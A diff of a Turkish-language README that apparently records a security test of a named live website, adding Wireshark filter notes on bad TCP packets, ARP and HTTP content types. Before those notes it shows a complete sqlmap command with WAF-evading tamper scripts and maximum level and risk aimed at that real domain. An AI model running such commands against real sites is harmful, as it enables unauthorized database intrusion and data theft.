@@ -25,12 +25,20 @@ WAF ile korunduğu için bazı sql injectionlar denenemedi bunlar txtler içinde
 ### 4-) python sqlmap.py -u "https://www.mustso.org.tr/Default.aspx" --dbs --forms --crawl=2 --dbms=postgresql --tamper=space2comment --random-agent --time-sec=10 --level=5 --risk=3
 #### Bu test yüksek fazda olmuştur ve 11 saate yakın bir süreçte tamamlanmıştır.
 
-
+<br>
 
 # Testler (Wireshark) üzerinden yapılmıştır.
 
-## Bad TCP
+## 1. Bad TCP
 tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack <br>
 Bad TCP 54 tane taradımız ağ’da bulduk, bunları göremek için github linkin’den ulaşabilirsiniz
 
 
+## 2. ARP (Address Resulation Protocol)
+Tipik bir kullanım, bir IP adresinin (ör. 192.168.0.10) temel Ethernet adresine (ör. 01:02:03:04:05:06) eşlenmesidir. ARP bu adreslerin keşfedilme şekli olduğundan, genellikle bir konuşmanın başında ARP paketlerini görürsünüz.
+<br>Aşağıda 9 tane (ARP) paketini mustso’dan yakaladık. ARP bizim için önemli bir bilgidir.
+
+
+## 3. HTTP (Hypertext Transfer Protocol)
+Çok fazla içerik türü(content types) En kiritik buldumuz kısımda Application buldundu kısımdır.
+Kötü amaçlı ve yazılım ararken kullandığınız etiket içerik türü ve uygulama türüdür.
